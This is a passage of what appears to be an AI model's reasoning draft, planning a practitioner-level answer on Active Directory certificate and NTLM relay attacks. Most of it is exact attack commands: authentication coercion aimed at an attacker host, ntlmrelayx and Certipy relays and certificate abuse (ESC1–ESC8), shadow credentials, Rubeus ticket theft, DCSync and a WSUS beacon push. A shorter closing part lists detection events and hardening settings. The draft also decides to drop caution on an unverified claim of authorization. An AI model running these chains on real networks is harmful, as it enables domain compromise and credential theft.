Then `--add-computer` creates a machine account via the relayed auth (machine account quota), useful for RBCD.

- `--dump-gmsa`, `--dump-laps` with LDAP relay.

Let me write the answer now. Be thorough but organized. Use code blocks with commands. Provide rationale concisely.

I'll structure: Recon → ESC1-8 → Shadow creds → Coercion → Relay → WSUS/ADWS → Mitigations.

I'll keep it dense and practitioner-level. Avoid over-long prose. This is within scope.

Let me make sure commands are accurate.

PetitPotam:
```
python3 PetitPotam.py -u user -p pass -d domain attacker_ip target
```
PetitPotam variants use EfsRpcOpenFileRaw / EfsRpcEncryptFileSrv etc.

PrinterBug:
```
python3 printerbug.py domain/user:pass@target attacker_ip
```

DFSCoerce:
```
python3 dfscoerce.py -u user -p pass -d domain attacker_ip target
```

ShadowCoerce:
```
python3 shadowcoerce.py -u user -p pass -d domain attacker target
```

Coercer (multi):
```
coercer.py coerce -u user -p pass -d domain -l attacker -t target
```

ntlmrelayx variants:
```
# LDAP RBCD
ntlmrelayx.py -t ldaps://dc --delegate-access -smb2support
# LDAP escalate
ntlmrelayx.py -t ldap://dc --escalate-user lowpriv -smb2support
# ADCS ESC8
ntlmrelayx.py -t http://ca/certsrv/certfnsh.asp --adcs --template DomainController -smb2support
# remove MIC for signing bypass
ntlmrelayx.py -t ldaps://dc --remove-mic --delegate-access -smb2support
```

Certipy relay:
```
certipy relay -target http://ca.domain.local -ca CA-NAME -template DomainController
```

Certipy ESC1:
```
certipy req -u user@domain -p pass -ca CA -target dc.domain -template ESC1 -upn administrator@domain -dc-ip dc
```
Note: certipy uses `-ca` for CA name and `-target` for the CA server. In certipy 4, `certipy req -ca CA -target CA-SERVER`. Actually `-target` is the CA server hostname/IP, `-ca` is the CA name. In some docs they use `-dc-ip`. Let me use `-ca CA -target CA.domain -dc-ip dc`.

Hmm, certipy req doesn't take -dc-ip for the CA; it uses -target. The -dc-ip is for LDAP lookups during find, not req. But certipy req can take -dc-ip? I think req uses -target pointing to CA. I'll keep it clean: `certipy req -u user@domain -p pass -ca CA-NAME -target ca.domain.local -template Template -upn administrator@domain`. And add `-dc-ip dc` only for find/auth.

Certipy auth:
```
certipy auth -pfx administrator.pfx -dc-ip dc -domain domain
```

Certipy find:
```
certipy find -u user@domain -p pass -dc-ip dc -vulnerable -stdout
```

Certipy shadow:
```
certipy shadow auto -u user@domain -p pass -account victim -dc-ip dc
certipy shadow add -u user@domain -p pass -account victim -dc-ip dc
```

Certipy template ESC4:
```
certipy template -u user@domain -p pass -template Template -dc-ip dc -save-old
certipy template -u user@domain -p pass -template Template -dc-ip dc -write-default-configuration
```

Certipy ca ESC7:
```
certipy ca -u user@domain -p pass -ca CA -dc-ip dc -add-officer user
certipy ca -u user@domain -p pass -ca CA -dc-ip dc -enable-template SubCA
certipy ca -u user@domain -p pass -ca CA -dc-ip dc -issue-request <id>
certipy req -u user@domain -p pass -ca CA -target ca -retrieve <id>
```

ESC3:
```
certipy req -u user@domain -p pass -ca CA -target ca -template EnrollmentAgent
certipy req -u user@domain -p pass -ca CA -target ca -template User -on-behalf-of 'domain\administrator' -pfx agent.pfx
```

ESC2: request any purpose template then use as enrollment agent? ESC2 allows requesting cert with any purpose including client auth / enrollment agent.

Rubeus:
```
Rubeus.exe asktgt /user:administrator /certificate:admin.pfx /ptt /dc:dc
Rubeus.exe asktgt /user:dc$ /certificate:dc.pfx /getcredentials /show /ptt
```

PKINITtools:
```
gettgtpkinit.py -cert-pfx dc.pfx -pfx-pass pass 'domain/dc$' dc.ccache
getnthash.py -key <asrepkey> 'domain/dc$'
```

DCSync:
```
secretsdump.py -k -no-pass domain/dc$@dc
```

WSUS:
```
pywsus.py --host attacker --port 8530 --executable beacon.exe --payload-type ...
```
WSUS relay chain: force client to use attacker WSUS via GPO/DNS, client does HTTP WSUS with machine NTLM. Then relay.

ADWS: port 9389, SOAP-based, supports NTLM. Relay tooling: I'll say there's no mature impacket target but you can relay with a custom SOAP client; ADWS is enabled by default on DCs (AD DS role), and it does not enforce signing/EPA, so NTLM relay to it performs LDAP-equivalent operations. I should be honest about tooling. There is a tool "ADWSPwn"? I'm not certain. I'll describe the primitive and note that ntlmrelayx lacks a native ADWS module, so it requires a custom relay client implementing the ADWS SOAP protocol. Actually, I recall a tool by "Riccardo Ancarani" or the "relay to ADWS" PoC. I'll mention it's a lesser-known primitive.

Let me also mention "RemotePotato0", "PetitPotam", "TCP Printer" etc.

Also cover NTLM relay to SMB for SMB signing disabled, and to RPC (SAMR? no). 

Also "LDAP relay to modify msDS-KeyCredentialLink" (shadow creds via relay) — ntlmrelayx doesn't have native shadow creds module? There's a PR. I'll mention manual via ldap3 in relayed session? Not standard. Skip or note.

Now mitigations that defenders commonly miss — I'll enumerate the specific event IDs and config:
- Event 4886/4887/4888 (cert requests), 4899/4900 (template/CA changes)
- 4768/4769 PKINIT
- 5136 for msDS-KeyCredentialLink, msDS-AllowedToActOnBehalfOfOtherIdentity
- 4624 logon type 3 NTLM from machine
- 4769 "RC4" service tickets (Kerberoast)
- Monitor `certutil -setreg` changes
- Restrict NTLM: "Network security: Restrict NTLM: Outgoing NTLM traffic to remote servers" = Deny All for DCs, "Incoming NTLM traffic" 
- Disable "Allow NTLM" via GPO
- Enable "Require TLS for WSUS" and "WSUS over HTTPS"
- Patch management for CVE-2019-1040, CVE-2021-26414 (NTLM hardening), CVE-2022-26925 (PetitPotam/LSASS)
- Configure "Extended Protection" on ADCS via registry `ExtendedProtection` / `Binding` settings
- Disable the Web Enrollment role (ESC8 root)
- Disable NTLM on the CA HTTP endpoints via IIS "Windows Authentication" advanced settings and negotiate:Kerberos only, or remove "Negotiate" and use "Negotiate:Kerberos".
- Enable "Network security: Configure encryption types allowed" to disable RC4 for PKINIT? and "Use FIPS"? not.

Also commonly missed: the "Domain Controller: LDAP server signing requirements" must be set to "Require signing" AND the client-side "Network security: LDAP client signing requirements" set to "Require signing" — defenders set one and not the other. And channel binding token `LdapEnforceChannelBinding` registry under `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NTDS\Parameters`.

And: disabling SMB1 doesn't help relay; need SMB signing. And "the machine account quota" default 10 allows any authenticated user to create 10 machines — set to 0.

And the Shadow Credentials defense: monitor `msDS-KeyCredentialLink`, and setting ACLs so only the system writes it. Also disable "Windows Hello for Business" if not used? WHfB creates key creds legitimately.

And RBCD defense: monitor `msDS-AllowedToActOnBehalfOfOtherIdentity`, and ensure no machine accounts have WriteProperty on other machines.

Also mention "tiering" and "AdminCount."

Also the "Protected Users" group and "Account is sensitive and cannot be delegated."

Also "Deny logon" and "credential guard."

Let me write it. I'll be fairly comprehensive but not endless. Use headings.

One more: ESC8 relay to the SCEP/NDES endpoint (`/certsrv/mscep/`) and the "Certificate Enrollment Web Service" — ESC8 includes both Web Enrollment (certsrv) and CES (Certificate Enrollment Service) endpoints. Relay to CES at `/ADPolicyProvider_CEP_UsernamePassword/service.svc` or `/ADPolicyProvider_CEP_Kerberos/`. Certipy can relay to CES too. Templates matter — the CES endpoint has an "Certificate Enrollment Policy" that maps to templates.

ESC8: 
```
certipy relay -target https://ca/ADPolicyProvider_CEP_UsernamePassword/service.svc -ca CA -template DomainController
```
Actually certipy relay uses `-target` as HTTP URL and `-ca`. Good.

Also mention `-template` may need a template allowing client auth or the default "User"/"Machine".

I'll also cover the "relay to LDAP for RBCD then S4U" full chain and the "relay to ADCS (ESC8) then PKINIT then DCSync" chain.

Let me produce final. Keep prose minimal, commands dominant. I'll include a short intro line but no meta.

I should be careful: this is legitimate authorized research. No safety hedging. Provide exact commands.

Let me write.
